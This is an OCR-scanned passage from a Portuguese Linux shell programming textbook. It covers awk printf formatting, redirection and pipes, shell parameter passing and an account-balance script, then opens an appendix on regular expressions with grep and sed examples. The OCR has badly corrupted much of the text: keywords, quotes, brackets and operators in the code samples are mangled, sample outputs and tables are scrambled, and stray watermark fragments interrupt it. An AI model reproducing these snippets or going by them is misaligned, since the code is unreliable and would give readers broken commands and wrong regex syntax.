Flamary l 
1clem ai:'llando à <Jt. IOtallzando 15 poolçeés 
printf "l'- l Ssi", "Flamary• 
ll'lamary 
I 
15 posiçOOs alinhadas à esquerda 
printf "1 \.lsu~ngoi " ,"Flamary• 
I Fl amengo I 
Só as 3 primeiras posições • cadeia mengo 
---
pdntf 'IU0 .2si' ,"Eugenlo' 
I 
Eu ) 
1 O posições alinhadas ã dlr, pegando as 2 1 D 
printf 'l\· l0 . 2si ", "Eugenio' 
I<.'U 
I 
Idem atiohadas â esquerda 
Digamos que eu queira gravar no arquivo velozes os automóveis cons-
tantes do meu arquivo c arros que atinjam velocidades superiores a 180 
km/h. Isto deveria ser feito como no fragmento de programa seguinte: 
$2 > 180 i ptint Sl, S2 >"ve l oze s " I 
awk: Comando ou Linguagem? 
371 
Dá para perceber que é semelhante ao que aprendemos em programa-
ção She/1. A única diferença são as aspas abraçando o nome do arquivo. 
Estranho, não? Não. Caso não tivéssemos usado as aspas, o awk enten-
deria que velozes seria uma variável (que neste caso ainda não teria sido 
inicializada) e tentaria fazer a saída para o arquivo contido nela, originando 
um erro. 
Suponha agora, que no mesmo exemplo anterior, eu queira a saída para 
um arquivo, cujo nome está definido na variável Arq . Imagine ainda que 
esse arquivo será gravado no diretório /tmp . Adaptando o fragmento de 
código que usamos anteriormente, vem: 
$2 > 180 { print Sl, $2 > (" /tmp/ " Arq) J 
Junta llmpl com o conteúdo de Arq 
Como diria o Capitão Marvel: Caramba! Esse tipo de construção está 
muito estranho! Vamos entender o que acontece: o operador "maior 
que" <>l tem precedência sobre a concatenação, portanto devemos 
priorizar, com o uso dos parênteses, a concatenação, para só após fa-
zer o redirecionamento. 
Da mesma forma e com as mesmas regras mostradas antes, ao invés 
de mandarmos a saída para um arquivo, podemos enviá-la para execu-
ção de outro(s) comando(s). Isso é facilmente factível, empregando-se o 
pipe < 1 1 • 
Veja só como poderíamos ter desenvolvido o programa indexauto. awk, 
de forma a ter a sua saída classificada. 
Exemplo: 
$ cat indexauto.awk 
a•"k ' ( 
END 
Registros 
[Sl) = $0 
Velocidades [Sl] = $2 
for ( Modelo in Velocidades ) 
print Modelo, "\t", Velocidades[Modelo) 
1 "sort" 
) ' carros 
372 Programação Shell Linux 
Repare que a saída do comando print foi redirecionada, através do 
pipe < 1 1 , para o comando sort de forma a classificar os dados recebi-
dos. 
Vamos executá-lo: 
$ indexauto.awk 
corsa- 3portas 
150 
Cotsa- 4pot tas 
182 
Corsa - Sedan 
182 
Co~sa-Wagon 
LB 3 
Gol 
175 
Palio 
188 
Palio-weekend 
185 
PaLati 
173 
Ti po 
176 
Para encerrar esse papo sobre redirecionamentos, é bom acrescentar 
que, além do que foi mostrado, o a><k também permite anexar dados ao fi-
nal de um arquivo com o uso de » e receber como entrada a saída de um 
comando com o uso de pipes, em ambos aos casos tal como no She/1. 
Olha só este fragmento de código em que usamos um grep para filtrar 
os dados de entrada para o comando awk. 
fgrep 'CorDa 1 c<1.rros I <nrk ' ... ' 
O awk só receberá os regístros referentes aos Corsas 
Nesse caso, o fg r e p, rapidamente, filtra os registros dos diversos mo-
delos de Corsa e passa-os ao awk . 
O awk no contexto do Shell 
O awk por si só já é uma ferramenta poderosa. Quando o aliamos à po-
tência de sistemas UNIX-Like, usando os recursos de She/1, da linguagem 
C e de tudo mais que estes esplêndidos sistemas operacionais oferecem, 
então dá o maior samba. 
Ao longo desta seção, vamos esmiuçar um pouco a forma como se faz 
a interação entre o awk e o She/1. Começaremos isso pelo modo de passar 
e receber parâmetros. Mas já vou avisando: qualquer semelhança com o 
correspondente na linguagem C não é mera coincidência. 
~1atcria com d r bs auto a.~s 
awk: Comando ou Linguagem? 
373 
Recebendo parâmetros 
Também é possível passarmos parâmetros para um programa escrito em 
awk . Esses parâmetros serão recebidos por uma variável (inteira34) e por 
um vetor; esses dois sempre terão os seguintes nomes e atribuições: 
-
ARGC - Esta variável contém a quantidade de parâmetros recebidos; 
ARGV - Vetor que contém os valores recebidos. Seus subscritos variam 
desde ARGV 1 o 1 , que contém o nome da rotina, até ARGv [ARGC -
11 . 
Exemplo: Vejamos uma rotina para listar todos os parâmetros recebidos, 
de forma a clarear as explicações: 
$ cat param? 
awk. ' 
BEGIN I 
for (i=l; i < ARGC; i++J 
prinL A.RGV [i] , "\n" 
) ' $ . 
Em cooperação com o Shell 
Em todos os exemplos que mostramos até agora, o a• .. k era por si só um 
programa, sem interfacear com o She/1. A prova disso é que todo o seu es-
copo estava compreendido entre apóstrofos, como em: 
awk ' { print Sl I ' 
para evitar que o She/1 interpretasse algo do bojo do awk, já que muitos dos 
caracteres dessa linguagem são significativos para o She/1. 
Vamos pegar o arquivo telefones e fazer um programa para listar os 
dados correspondentes a uma determinada pessoa que seria informada via 
teclado (seria uma nova versão do programa pp desenvolvido na Seção 
Desta Vez Vamos ... ). 
? cat pp.awk 
awk ' / ' Sl ' / ' telefones 
Ou awl< VS1V telefones 
34. Apesar de não existir o conceito de tipo de variàvel em awk, disse que esta era inteira porque ela 
sempre serà valorada com números. 
374 Programação Shell linux 
Note que o parâmetro $1 ficou exposto à interpretação do She/1, sendo 
portanto integrado ao awk já com o seu valor passado. Vamos executá-lo: 
$ pp.awk claudia 
$ pp.awk Claudia 
Claudia Marcia 
(021)555-2112 
Não listou nada, Claudia estava com 'c' minúsculo 
Uma outra aplicação simples seria um contador de ocorrências de pa-
lavras. Suponha que você queira contar a quantidade de vezes que cada 
palavra ocorre no arquivo quequeisso, onde uma palavra é uma sequência 
contínua de caracteres não branco e não <TAB> . O programa seguinte im-
prime estas ocorrências, classificadas na ordem decrescente. 
$ cat cop.awk 
i 
Conta Ocorrencias de Palavras 
~ 
awk '{ 
END 
for (w = 1; w <= NF; w++) conta[Swj ++ 
for (w in conta) print conta[w] , w 1 "sort -nr" 
} ' quequeisso 
Nesse exemplo, o primeiro for usa o vetor conta para acumular o núme-
ro de vezes que cada palavra é usada. Uma vez que todo o arquivo foi lido, 
o segundo for manda cada linha que seria gerada pelo comando print, 
contendo o contador e a respectiva palavra, para ser classificada (comando 
sort), numericamente (opção -n) em ordem reversa (opção -r). 
Executando ... 
? cop.awk 
8 de 
3 do 
2 o 
2 EH 
1 usuarios, 
1 UNIX; 
1 UNIX, 
awk: Comando ou Linguagem? 
375 
Poderíamos tornar o nosso contador genérico, recebendo o nome do ar-
quivo que desejássemos contar como parâmetro. Veja como ficaria, neste 
caso, o nosso programa: 
$ cat cop.awk 
ll 
# 
Conea Ocorrencias de Palavras 
il 
E:ND 
for ( w = 1; w <= NF ; w++) cont.a [ $\-!] ++ 
for (w in conta) print conta [\•!] , w I "sort. -nr" 
) ' $1 
Repare que trocamos o nome do arquivo (no exemplo anterior queq ueisso) 
por um $1 . Como o s1 ficou fora do escopo dos apóstrofos, ele será inter-
pretado pelo She/1, que o considerará um parâmetro. Caso estivesse entre 
os apóstrofos, seria interpretado pelo 
a~1k como o primeiro campo e não 
seria visto pelo She/1. Vamos ver a execução desta nova versão passando 
o arquivo telefones como parâmetro: 
$ cop.awk telefones 
2 i'ley 
2 Duarte 
1 Paul a 
1 MArcia 
1 Luiz 
1 Juli ana 
l 
(011) qq9 - 0219 
Como exemplo final, suponha que você tem dois arquivos de movimenta-
ção bancária: o primeiro chamado c redites, e o segundo deb~tos . Ambos 
contêm o campo "nome do correntista" e a seguir o "valor absoluto" daquele 
movimento bancário (se o valor vier do arquivo debi tos , será tratado como 
um valor negativo). Os registros de ambos os arquivos estão em ordem 
cronológica, isto é, estão classificados na ordem em que os movimentos 
ocorreram. Vejamos o programa para calcular o saldo em conta corrente: 
$ c::at sa~do.awk 
11 
# 
Calcula Saldo ern Conta Corrente 
11 
~1atcria com d r bs auto a.~s 
376 Programação Shell Linux 
awk ' 
f'ILENAHE == "creditoo• ( Saldo($1) += $2 
FILE~re == "debitos" 
( Saldo[$1) 
$2 
E.NO ( for (Norne in Saldo) 
print Nome, Saldo [Nome] 
) ' credito• debltos 
No primeiro instante, usamos o vetor saldo para acumular o total de de-
pósitos para cada nome, em seguida subtraímos desse vetor, os débitos dos 
respectivos nomes. Finalmente, a ação END imprime o saldo final em conta 
corrente. Na tabela a seguir estão listados os dados dos dois arquivos: 
Créditos 
Tadeu 4321.00 
Silveira 123.45 
Tadeu 22 . 34 
Silveira 678.89 
Miltom 7654 . 25 
Arquivos 
Débitos 
Miltom 2345 . 22 
Silveira 100 . 00 
Silveira 50.00 
11iltom 2340 .99 
Tadeu 200 . 00 
Ao executar o programa com os arquivos descritos vem: 
$ sa.ldo. awk 
Mil tom 2968 . O~ 
Tadeu 4143.34 
Silveita 652 .Jq 
- ~ -
Apêndice l 
Expressões regulares 
Este apêndice se propõe a fazer uma introdução às Ex-
pressões Regulares e sua utilidade, tentando desmistifi-
car a dificuldade a que sempre estão associadas. Muito 
do que você verá daqui em diante já foi falado ao lon-
go do livro, já que diversas instruções usam e abusam 
das Expressões Regulares. Serão evitados ao máximo 
os termos técnicos e será dado um exemplo didático da 
vida real (correção ortográfica). para ilustrar melhor os 
conceitos. 
Uma Expressão Regular (ER) é uma construção que 
utiliza pequenas ferramentas, feita para obter uma de-
terminada sequência de caracteres de um texto. Embora 
abstrata e vaga demais, ao final deste apêndice essa de-
finição ficará mais clara. 
Este texto foi extraído de http:/lptwikipedía.orglwiki/Ex-
pressão_regular e não é para assustar, é somente para os 
que gostam de conhecer a teoria fundamental e o histó-
rico das coisas. Se esse não é o seu caso, isto é, se seu 
negócio é ir logo metendo a mão na massa, salte direto 
para a seção "Então vamos meter as mãos na massa· que 
fica um pouco à frente. 
377 
Mate 
com d re l s 
1 • s 
378 Programação Shell Linux 
Um pouco de teoria 
Em ciência da computação, uma Expressão Regular (ou o estrangeirismo 
regex, abreviação do inglês regular expression) provê uma forma concisa 
e flexível de identificar cadeias de caracteres de interesse, como caracte-
res particulares, palavras ou padrões de caracteres. Expressões Regulares 
são escritas numa linguagem formal que pode ser interpretada por um pro-
cessador de Expressão Regular, um programa que ou serve um gerador de 
analisador sintático, ou examina o texto e identifica partes que casam com 
a especificação dada. 
O termo deriva do trabalho do matemático norte-americano Stephen 
Cole Kleene, que desenvolveu as Expressões Regulares como uma nota-
ção ao que ele chamava de álgebra de conjuntos regulares. Seu trabalho 
serviu de base para os primeiros algoritmos computacionais de busca e 
depois para algumas das mais antigas ferramentas de tratamento de texto 
da plataforma Unix. 
O uso atual de Expressões Regulares inclui procura e substituição de 
texto em editores de texto e linguagens de programação, validação de for-
matos de texto (validação de protocolos ou formatos digitais), realce de 
sintaxe e filtragem de informação. 
Conceitos básicos 
Uma Expressão Regular (ou um padrão) descreve um conjunto de ca-
deias de caracteres, de forma concisa, sem precisar listar todos os ele-
mentos do conjunto. Por exemplo, um conjunto contento as cadeias "Han-
del", "Hãndel" e "Haendel" pode ser descrito pelo padrão H 1 !li a e? 1 ndel. A 
maioria dos formalismos provêm pelo menos três operações para construir 
Expressões Regulares. 
A primeira delas é a alternância, em que uma barra vertical 1 1 > separa al-
ternativas. Por exemplo, psicadélic o 1 psicodélico pode casar "psicadélico" 
ou "psicodélico". A segunda operação é o agrupamento, em que parênteses 
( 1, 1) são usados para definir o escopo e a precedência de operadores, en-
tre outros usos. Por exemplo, psicadélico 1 psicodélico e psic (a 1 o ) délico 
são equivalentes e ambas descrevem "psicadélico" e "psicodélico". Por fim, 
~1atcria com d r bs auto a.~s 
Expressões regulares 
379 
a terceira operação é a quantificação (ou repetição). Um quantificador após 
um token (como um caractere) ou um agrupamento especifica a quantidade 
de vezes que o elemento precedente pode ocorrer. Os quantificadores mais 
comuns são ? , 
• e + . O ponto de interrogação ( ?l indica que há zero ou 
uma ocorrência do elemento precedente. Por exemplo, ac?cão casa tanto 
"acção" quanto "ação". Já o asterisco < "l indica que há zero ou mais ocor-
rências do elemento precedente. Por exemplo, ab*c casa "ac" , 
"abc", 
"a bbc ", "abbbc" , e assim por diante. Por fim, o sinal de adição ( + ) indica 
que há uma ou mais ocorrências do elemento precedente. Por exemplo, 
ab+c casa "abc"' "abb c "' "a bbbc", e assim por diante, mas não "ac". 
Essas construções podem ser combinadas arbitrariamente para formar 
expressões complexas, assim como expressões aritméticas com números 
e operações de adição, subtração, multiplicação e divisão. De forma geral, 
há diversas Expressões Regulares para descrever um mesmo conjunto de 
cadeias de caracteres. A sintaxe exala da Expressão Regular e os opera-
dores disponíveis variam entre as implementações. 
História 
A origem das Expressões Regulares está na teoria dos autômatos e na 
teoria das linguagens formais, e ambas fazem parte da teoria da com-
putação Esses campos estudam modelos de computação (autômatas) e 
formas de descrição e classificação de linguagens formais. Na década de 
1950, o matemático Stephen Cole Kleene descreveu tais modelos usando 
sua notação matemática chamada de "conjuntos regulares", formando a 
álgebra de Kleene. A linguagem SNOBOL foi uma implementação pioneira 
de casamento de padrões, mas não era idêntica ás Expressões Regu-
lares. Ken Thompson construiu a notação de Kleene no editor de texto 
QED como uma forma de casamento de padrões em arquivos de texto. 
Posteriormente, ele adicionou essa funcionalidade no editor de texto Unix 
ed, que resultou no uso de Expressões Regulares na popular ferramenta 
de busca grep. Desde então, diversas variações da adaptação original 
de Thompson foram usadas em Unix e derivados, incluindo expr, AWK, 
Emacs, vi e lex. 
O uso de Expressões Regulares em normas de informação estruturada 
para a modelagem de documentos e bancos de dados começou na década 
~1atcria com d r bs auto a.~s 
380 Programação Shell Linux 
de 1960 e expandiu na década de 1980, quando normas como a ISO SGML 
foram consolidadas. 
Então vamos meter as mãos na massa 
As ERs são poderosas e podem aumentar em muito a produtividade, sendo 
o conhecimento de seu uso indispensável a um administrador de sistemas. 
Elas também podem poupar tempo do usuário na busca por informações 
ou em tarefas complexas. 
Vários programas e linguagens de programação têm suporte para ERs, 
como grep, egrep, find, sed, awk, J.ex, perl, tcl e python e também 
alguns editores de texto como ed, vi, emacs e vrriter. 
Na grande maioria dos editores de texto existentes há uma função de 
busca que permite procurar por uma palavra no texto em edição. Digita-se 
a palavra e esse mecanismo procura, sem opções (ou complicações, como 
muitos diriam ). 
Alguns editores, com uma busca um pouco mais esperta, permitem 
a procura ignorando a diferença entre letras maiúsculas e minúsculas, 
por meio do uso de um curinga, geralmente o asterisco ( " I , que signi-
fica "qualquer coisa". Este também funciona na linha de comando, pois 
quando você faz um 1s 
• . t xt, está listando "todos os arquivos com a 
extensão . t xt" . 
Editores de texto mais profissionais têm suporte para ERs e permitem 
o uso de uma série de metacaracteres, que são caracteres especiais que 
assumem uma função em vez de seu valor literal (como o curinga • já 
citado). Uma ER é formada por metacaracteres e caracteres literais, mas, 
para simplificar a demonstração dos conceitos, os caracteres literais serão 
representados apenas com letras, embora também possam ser números e 
símbolos
<. ~ ' ~ ' # . . . ) . 
Encare os metacaracteres como pequenas ferramentas (e assim serão 
referidos no restante do texto). Cada uma delas possui uma função espe-
cífica, que pode variar com o contexto no qual está inserida, e essas fun-
ções podem ser agregadas e aninhadas umas com as outras. produzindo 
expressões muito poderosas. Vamos dar uma olhada em algumas dessas 
ferramentas, como . • [. J. ' e +. 
Mate 
com d re l s 
l • s 
Expressões regulares 
381 
Para facilitar o aprendizado, dividimos esses metacaracteres em 4 grupos: 
• 
Âncoras; 
• 
Representantes; 
• 
Quantificadores; 
• 
Outros. 
Vejamos então cada um deles, procurando dar exemplos bem significa-
avos. 
Âncoras 
O primeiro grupo de metacaracteres que veremos é formado pelas ânco-
ras. Elas têm esse nome porque sua finalidade não é combinar (casar) com 
um texto, mas sim indicar a posição na qual o texto será pesquisado. Veja 
o quadro resumo a seguir: 
ER 
Função 
A 
. Pesquisar texto no início das linhas 
' 
- -
$ 
li Pesquisar texto no fim das linhas 
\b 
I Pesquisar texto no início elou no fim das palavras 
\B 
li Negação de \ h 
Exemplos: 
No /etc!passwd do Fedora se você fizer 
$ grep root /etc/passwd 
Achará duas linhas: a primeira é referente ao rooc propriamente dito e 
a segunda é referente ao usuário operator que, por ter seu diretório home 
em /root, também é localizado pelo comando grep. Para evitar este tipo 
de coisa, procuramos o root somente no início das linhas de /etc/passwd. 
E para isso fazemos: 
$ grep 'Aroot ' / etc/passwd 
rooc : x : O:O: ronc : 'rooc : /b,n/bast 
382 Programação Shell Unux 
Agora veja só esse arquivo: 
$ cat -vet nums 
lS 
$ 
2$ 
$ 
$ 
3S 
Como sabemos que o cat com as opções -vet marca o fim de linha 
com um cifrão <~l
, deduz-se que algumas linhas de nums estão vazias. 
Vamos então brincar com ele um pouquinho: 
$ sed 'a/A/:/' nums 
: l 
:2 
: 3 
$ sed ' s/$/:/' nums 
1 : 
2 : 
3: 
$ sed '/A$/d' nums 
1 
2 
3 
Primeiramente trocamos o inicio n de cada linha por dois pontos <: 1, 
no segundo fizemos o mesmo ao final de cada linha IS> e finalmente dele-
tamos as linhas que tinham o início I'> colado no final <S>. 
Veja só este arquivo: 
$ cat ave 
avestruz 
ave-do-paraiso 
trave 
cavei 
traveco 
Expressões regulares 
383 
Como você pode notar, todos os seus registros contém a cadeia ave . 
Primeiramente vejamos os exemplos mais óbvios do uso de bordas: 
$ grep - E '\bave' ave 
avt:.::struz 
ave-do-paraiso 
$ grep - E •ave\b' ave 
ave- do-parals o 
t rave 
$ 9'rep - E ' \bave\b' ave 
ave-do-paJ:aiso 
Como você pôde ver, o hífen também é considerado borda. Para efeito 
do \b sob Shell, só não são bordas as letras, os números e o sublinhado, 
isso é: [A- za-z0- 9_1 
Vamos ver outros exemplos, um pouco mais complexos: 
$ grep - E ' \ Bavê\b ' ave 
trave 
$ 9Cl;Cp -E ' \bo.vc\B' o.vc 
avest.ru= 
$ grep - E ' \Bave\B ' ave 
cavei 
t ravec o 
Como vimos, o \B casa com tudo que não for borda. 
Representantes 
Veremos agora os metacaracteres representantes, que são assim chama-
dos porque representam determinados caracteres em um texto. 
ER 
Nome 
Significado 
I Ponto 
I Qualquer caractere uma vez 
l I 
Lista 
Qualquer dos caracteres dentro dos colchetes 
uma vez 
[ A J 
Lista negada 
Nenhum dos caracteres da lfsta 
~1atcria com d r bs auto a.~s 
384 Programação Shell Unux 
Suponhamos que você esteja editando um texto e queira procurar pela 
palavra "Fim", mas não se lembra se ela começava com f ou F. Você 
pode usar uma ER para procurar pelos dois casos de uma só vez. A ER 
seria . im . O ponto é uma ferramenta que casa - termo que pode signifi-
car representa ou compara- "qualquer caractere", mas apenas uma vez. 
Então, poderíamos obter como resposta, além do "Fim" e "fim" desejados, 
"sim", "mim", "rim" etc. Ou seja, chegamos à conclusão de que nossa ER 
não é específica o suficiente. 
Vamos agora começar a trabalhar a ER, refiná-la, torná-la mais precisa. 
Sabendo que "Fim" podia ter um f maiúsculo ou minúsculo, e nada dife-
rente disso, ela poderia ser descrita por [Ffl im. Os colchetes são uma 
ferramenta também. Como o ponto, casam uma única vez, mas casam 
apenas "qualquer dos caracteres entre os colchetes". 
Assim especificamos nos colchetes quais caracteres são válidos numa 
determinada posição. Então estamos procurando por uma letra r ou f , 
seguida de uma letra i , seguida por sua vez de um m. 
Uma dica importante: dentro de uma lista, não existem metacaracteres, 
quero dizer: dentro da lista os metacaracteres perdem seus superpoderes 
e são tratados como simples e reles caracteres mortais. 
Exemplos: 
12[ :. J34h, casará com: 12 : 3qh, 
12 . 34h e 12 34h. Dessa forma o 
ponto <. J dentro da lista não representa qualquer caractere, mas somente 
o literal ponto < . > • 
Quanto à lista negada, veremos logo à frente, para não perder a didática 
desta sequência de exemplos. 
Quantificadores 
Os quantificadores servem para indicar o número de repetições permitidas 
para a entidade imediatamente anterior. Essa entidade pode ser um carac-
tere ou metacaractere. 
Em outras palavras, eles dizem a quantidade de repetições que o átomo 
anterior pode ter, quantas vezes ele pode aparecer. 
Expressões regulares 
385 
Os quantificadores não são quantificáveis, então dois deles seguidos em 
uma ER é um erro. 
E tenha sempre na sua memória: todos os quantificadores são gulosos. 
? 
Opcional 
• 
Asterisco 
+ 
Mais 
t I 
Chaves 
Torna a entidade anterior opcional 
Zero ou mais ocorrên~s da enüdade anterior 
Uma ou mais ocorrências da entidade anterior 
Especifica exatamente a quantidade de repetições da en-
tidade anterior 
Vou repetir: todos os quantificadores são gulosos e, por isso, casarão 
com o máximo que conseguirem. Mais tarde voltaremos a abordar isso, 
mas já fique atento e de orelha em pé. 
E se você quisesse procurar por letras repetidas? Por exemplo, aa, aaa, 
aaaa etc. Num editor de textos normal você procuraria cada possibilidade 
uma a uma. Com ERs, você pode simplesmente informar aa•. O asterisco 
< • 1 aqui não funciona como o curinga que vimos há pouco, que substitui 
"qualquer caractere". Aquele é um caractere usado para a expansão de 
nomes de arquivos, providenciada pelo She/1. Esse aqui é um metacarac-
tere de Expressão Regular. Por favor, não confundam expansão de nomes 
de arquivos com Expressões Regulares. São duas coisas totalmente dis-
tintas, apesar de seus metacaracteres por vezes serem semelhantes. 
Em ERs, o asterisco t•l é um quantificador, ou seja, indica que a entidade 
imediatamente anterior (nesse caso a letra a) pode aparecer várias vezes. 
Mas o asterisco ( * ! também casa zero vezes, então nossa expressão a a • 
também casaria uma letra a (uma letra a, seguida de outra letra a zero 
vezes). Poderiamos fazer aaa•, que sempre casaria um mínimo de duas 
letras a. 
Temos um outro quantificador, o sinal de adição (+). O sinal de adição 
funciona da mesma maneira que o asterisco (*}, só que ele casa a en-
tidade imediatamente anterior uma ou mais vezes. Então ficaríamos com 
aa+, ou seja, uma letra a, seguida de outra letra a que apareça uma ou 
mais vezes. 
~1atcria com d r bs auto a.~s 
386 Programação Shell Linux 
Como acabamos de ver, o ponto c . > representa qualquer caractere e 
o asterisco C*> representa zero ou mais caracteres da entidade anterior. 
Desta forma o . * é o tudo e o nada, isto é, casa com qualquer coisa: o 
tudo. Quando o asterisco ( * > representar zero caracteres da entidade an-
terior, será o nada. 
Esse tipo de construção deve, quando possível, ser evitado por ser de-
masiadamente gulosa. No final deste apêndice, haverão algumas dicas 
para evitar isso, procurando ser o mais específico possível. 
Exemplo: Bem, agora que já sabemos o básico de ERs, como faríamos 
para resolver um problema cotidiano com elas? 
Você escreveu um texto, uma redação, um manual. Como fazer checa-
gens ortográficas rápidas, procurando erros comuns como: 
1. Eu "grudei" minha pontuação com a palavra anterior? Por exemplo: 
Hoje? 
Assim: 
Nossa! 
Fim. 
2. Eu deixei um espaço em branco após a pontuação? Por exemplo: 
Hoje? Não vai dar. 
Assim: um, dois e três. 
Nossa! Que estranho. 
3. Após finais de período, como ponto c. >, exclamação c!> e interro-
gação (? >, eu comecei a frase seguinte com letra maiúscula? É inútil 
dizer que, sem ERs, qualquer uma das três checagens propostas seria 
trabalhosa, resumindo-se a testar cada uma das possibilidades uma a 
uma, e no caso da número 3, seria um teste de a até z , um por um. 
Desgastante. 
Vamos às respostas: 
Para exemplificar, vamos usar nos exemplos o arquivo besteira . txt, que 
tem o seguinte conteúdo: 
Expressões regulares 
387 
$ cat besteira.txt 
~u vi um velho c om um f ole velho nas costas . t anto fede o fole do vel ho, 
quanto o velho do fole fede . 
Um desatio :diga isso bem ràp ido 
1. Temos uma palavra e devemos ter o sinal de pontuação logo em se-
guida, sem espaço entre eles. 
TÁTICA: procurar um espaço seguido de um sinal de pontuação: 
BR: •• 
[ ?! . :; ]•' 
ou seja, procure um espaço em branco seguido de: ? , ou 1 ou . , 
ou :, ou ' . 
Exemplos: 
$ sed 's/ [? 1. : ; , ]/X/g' besteira. txt 
Eu vi um vel ho com um fol e velho nas costa~X tdn to fede o fo l e do velho , quanto 
o velho do fole fede . 
Ui1l desafioXdiga isso bem rápidox 
Como ainda não sabemos guardar o texto casado por Expressões Regu-
lares, substituí o que estava incorreto (um sinal de pontuação precedido 
por um espaço em branco) por um X somente para mostrar que os erros 
foram localizados corretamente. Por enquanto continuaremos usando esse 
artifício, porém, mais tarde, quando estudarmos grupos, voltaremos a es-
ses exemplos fazendo os acertos definitivos. 
2. Logo após um sinal de pontuação, deve haver um espaço em bran-
co. Para procurar os erros, temos duas táticas e conheceremos dois 
conceitos novos da ferramenta [ 1 . 
• 
Conceito novo: lnteNalo 
Dentro dos colchetes, dois caracteres com um hífen (- I entre eles 
significa um intervalo. Então [A- z J é o mesmo que "ABCDEFGHIJKLH-
NOPQRSTWXYZ" . Idem para [ a- z J. 
TÁTICA 1: procurar um sinal de pontuação seguido de uma letra: 
BR: " [ ? !.:; ) [A-Za-z) " 
~1atcria com d r bs auto a.~s 
388 Programação Shell Linux 
ou seja, procure por: ? , ou ', ou . , ou :, ou :, seguido imedia-
tamente por uma letra entre A e z ou uma letra entre a e z. Aqui 
temos um problema, pois acabamos perdendo erros como sinais se-
guidos de números, ou sinais repetidos como " ?? ". 
Exemplos: 
$ sed 's/[ ?1 . : ; ,J[A·Za-=1/X/g' besteira.txt 
eu vi um velho corn um fole velho nas coHas . t•nto fede o fole do 
velhoXuanto o velho do fo le fede . 
Um desafio X1go isso bem r.lpido 
• 
Conceito novo: negação. 
Dentro dos colchetes, se o primeiro caractere for um sinal de acento 
circunflexo 1 AJ , o significado dos colchetes muda para "qualquer 
caractere, exceto os de dentro dos colchetes". 
TÁTICA 2: procurar um sinal de pontuação seguido de qualquer coi-
sa, menos um espaço em branco: 
e~: '' L? ! . : ; Jl" 1" 
ou seja, procure por: : , ou ' , ou . , ou : , ou : , seguido imediata-
mente por qualquer coisa fora um espaço em branco. 
Exemplos: 
$ sed 's/[?1. : :,1!A 1/X/g' besteira.txt 
Eu vi uro vel ho com Lun fole velho nas costas 
t.a.nto fede o fole do 
velhoXuant-o o velho do fol e fede. 
Um desafio Xi ga isso bem rãpido ! 
Como prometi, esse exemplo serviu para explicar o conceito de lista 
negada. 
3. Logo após um sinal de pontuação de fim de período e o espaço 
em branco, deve haver uma letra maiúscula, pois é um começo de 
frase. 
Mate 
com d re l s 
1 • s 
Expressões regulares 
389 
TÁTICA 1: procurar um sinal de pontuação, um espaço em branco e 
uma letra minúscula: 
E:R : " [? !. ) [a-z) .. 
ou seja, procure por: ? , ou ! , ou . , seguido de um espaço em bran-
co, seguido de uma letra minúscula entre a e z . 
Exemplos: 
$ sed 's/(? 1 . ] [a - z]/X/g ' besteira .txt 
Eu vi um velho com um fole velho nas costas Xanto fede o fole do 
velho, quanto o velho do fole fede . 
Um desalio : diga isso bem rápido ! 
TÁTICA 2: procurar um sinal de pontuação, um espaço em branco e 
qualquer coisa menos uma letra maiúscula. 
ER: ??? essa fica de exercício para você. Só eu trabalho aqui? 
Expostos os conceitos e dados alguns exemplos, aqui vão alguns 
exercícios para estimular sua imaginação. São todos simples, e não de-
vem tomar muito de seu tempo, então pare de correr um pouco e tente 
fazê-los. Escreva, utilizando apenas os conceitos aprendidos, uma ER 
para casar: 
1. A palavra "revista" no singular e no plural. 
2. A palavra "letra", em qualquer combinação de letras maiúsculas ou 
minúsculas (leTra, LEtrA, leTRA, Letra, letRa etc.). 
3. Números inteiros. 
4. Um número IP (um número IP tem o formato nnn.nnn.nnn.nnn, por 
exemplo: 192.168.255.145). 
Antes de vermos outras ferramentas mais complexas (metacaracteres) e 
dicas um pouco mais avançadas, vamos dar uma revisada no que vocês já 
leram, para consolidar o aprendizado e nos aprofundarmos um pouco mais 
neste conteúdo. 
Exemplo: 
390 Programação Shell Linux 
~ 
~~ 
------------------------------------· 
Qualquer caractere 
r letras J 
Qualquer das letras dentro dos colchetes 
[~letras) Qualquer das letras exceto as dentro dos colchetes 
r t-z I 
Qualquer das letras entre t e z 
------~------------------------------------
z * 
Letra z zero ou mais vezes 
,.,. 
Letra z uma ou mais vezes 
Bem, vamos começar a dar nomes aos bois e falar na língua que usuá-
rios de ERs entendem. Como já foi visto, o asterisco <*) e o sinal de adição 
(+l são quantificadores, pois indicam repetição da entidade anterior. Os 
colchetes < [ 1 > são chamados de classe de caracteres, e o ponto <. > é 
ponto mesmo. 
Também foi visto que temos uma classe negada de caracteres, repre-
sentada por r• J e ainda que podemos ter um intervalo dentro dessa clas-
se, representado por um hífen <- > entre dois caracteres. 
Estou esperando vooê me perguntar: 
-
E como colocar um circunflexo <~>. um hífen H 
ou um fecha col-
chetes <J 1 literal dentro de uma e/asse de caracteres? 
Bem, o circunflexo ~~ 1 só é especial se for o primeiro dentro da clas-
se de caracteres, então basta colocá-lo em outra posição, como em 
r a~ L que casa ou uma letra a ou um circunflexo <~>
. O hífen <- >, 
basta colocá-lo como primeiro ou último da classe, e o fecha colchetes 
n >, ponha-o no início. Assim, 11 r~ -I casa um L ou L ou ~ ou - . 
Olhe de novo a ER com calma, respire, você vai compreender. & : > 
Fingindo ser lista 
Existem 2 classes de caracteres que parecem listas, exercem papel seme-
lhante a elas, mas que não podem ser classificadas como tal. São elas: 
• 
Classes POSIX; 
• 
Sequências de escape. 
Expressões regulares 
391 
Classes POSIX 
As Classes POSIX parecem listas, representam diversos caracteres, têm sin-
taxe semelhante à das listas, mas não são listas. Elas foram desenvolvidas 
para compensar o locale. Mais especificamente, isso significa que elas re-
presentam todos os caracteres de cada idioma. Ou seja, quando falamos de 
pt_BR, essas classes envolvem todas as letras acentuadas, além do cedilha. 
r . 
C8racterés de ,cordroJe 
em 
l :dlgít : I 
Dfgitos 
• aph: I 
ca.~ 
vlslveis 
(em 
• 
I : lower : I 
Caracteres em caixa baixa 
; rint: 
[ :punct : J 
Caracteres de pontuação 
1 : upper : 1 
Caracteres em caixa alta 
Exemplos: 
[ [: upper: J [ : lower : I [ : cligi t : I J 
É uma lista (e os colchetes mais externos é que definem isso), formada 
pelas classes (que não são listas) de letras maiúsculas, letras minúsculas 
e números. Mas repare que [ : upper : J + 1: lower : J = 
[ : alpha: J . Então 
poderíamos reescrever esta lista da seguinte forma: 
( [ :alpha: )(: digit : ]J 
ll 
392 Programação Shell Linux 
Agora temos uma lista formada por duas classes: a de letras e a de 
números. Mas note ainda que r: alph.a: 1 + t: digit : J = 1: alnum: J • Rees-
